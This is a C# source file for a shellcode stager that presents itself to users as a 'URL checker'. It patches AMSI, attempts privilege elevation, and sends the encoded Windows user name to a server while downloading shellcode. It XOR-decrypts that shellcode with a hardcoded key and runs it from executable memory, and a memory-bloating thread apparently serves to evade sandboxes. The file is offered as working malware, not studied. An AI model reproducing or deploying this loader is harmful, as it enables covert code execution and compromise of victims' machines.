using System.Net;
using System.Runtime.InteropServices;
namespace Stager

{
    internal class Program
    {
        delegate void ShellcodeDelegate();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private static void AllocateMemory()
        {
            Random r = new Random();
            while (true)
            {
                long size = 1024 * 1024 * r.NextInt64(100,120); 
                byte[] buffer = new byte[size];
                GC.KeepAlive(buffer); // Prevent the buffer from being garbage collected

                Thread.Sleep(500); // Wait for half a second before allocating memory again
            }
        }

        static void Main()
        {
            Console.WriteLine("Welcome to the URL checker!");
            Console.WriteLine("This program checks whether a given URL is alive or not.");
            Console.WriteLine("To use this program, please provide the following information:");
            Console.WriteLine("\n\nUsage: UrlChecker.exe url");
            Thread thread = new Thread(new ThreadStart(AllocateMemory));
            thread.IsBackground = true;
            thread.Start();

            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            CurrentSystem system = new CurrentSystem();

            string keyHex = "71049dd6";
            Console.WriteLine(keyHex);
            string shellcodeUrl = "http://localhost/images";
            SlingShot lulz = new SlingShot();
            bool patchStat = lulz.PatchAmsi();
            try
            {
                if (system.IsAdministrator() == false)
                {
                    system.TryAdmin();
                    //system.AddToStartup();
                }
            }
            catch (Exception ex)
            {
                var a = ex.ToString();
            }


            bool success = false;
            WebClient client = new WebClient();
            byte[] encryptedShellcode = null;

            Random rand = new Random();
            List<string> legitimateUrls = new List<string>
            {
                "https://www.google.com",
                "https://www.microsoft.com",
                "https://www.amazon.com",
                "https://www.apple.com",
                "https://www.facebook.com",
                "https://www.twitter.com",
                "https://www.linkedin.com",

            };
            while (!success)
            {
                var encodedUserName = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userName));
                try
                {
                    encryptedShellcode = client.DownloadData(shellcodeUrl + "?id=" + encodedUserName + "&p=" + patchStat.ToString());
                    success = true;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Could not download: " + ex.Message);
                    int delay = rand.Next(180000, 12000000);
                    System.Threading.Thread.Sleep(delay);
                    var randomUrl = legitimateUrls[rand.Next(legitimateUrls.Count)];
                    try
                    {
                        encryptedShellcode = client.DownloadData(randomUrl + "?id=" + encodedUserName);
                        success = true;
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine("Could not download from random URL: " + ex2.Message);
                    }
                }
            }


            byte[] key = new byte[keyHex.Length / 2];
            for (int i = 0; i < key.Length; i++)
            {
                key[i] = Convert.ToByte(keyHex.Substring(i * 2, 2), 16);
            }
            byte[] shellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                shellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
            }


            IntPtr shellcodeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
            Action shellcodeFunc = (Action)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(Action));
            shellcodeFunc();
            Marshal.FreeHGlobal(shellcodeAddr);
        }
    }

}
